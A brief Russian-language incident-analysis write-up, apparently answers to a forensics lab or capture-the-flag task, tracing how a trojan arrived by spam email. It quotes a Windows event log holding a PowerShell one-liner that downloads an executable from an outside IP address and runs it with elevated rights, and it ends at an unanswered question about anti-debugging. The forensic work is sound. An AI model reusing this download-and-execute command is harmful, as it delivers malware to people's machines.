# 1 Как ВПО попало на компьютер?
Через спам рассылку на почту

# 2 С какого сервера?
Посмотрев события винды видим откуда был скачан файл:

ip: http://95.169.192.220:8080
Logfile:

```
file:///C:/Users/Evgeniy/AppData/Local/Temp/Rar$DIa2900.6159/TOP_SECRET.pdf
Trojan:Win32/Znyonm
Поставщик "Registry" находится в состоянии Started. 

Подробные сведения: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.906
	HostId=9da22629-af52-4b50-a1e3-c0b8ad39c1a1
	HostApplication=powershell -command ($drop=Join-Path -Path $env:APPDATA -ChildPath Rjomba.exe);(New-Object System.Net.WebClient).DownloadFile('http://95.169.192.220:8080/prikol.exe', $drop); Start-Process -Verb runAs $drop
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=
```

# 4 Какие методы противодействия отладке использует программа? 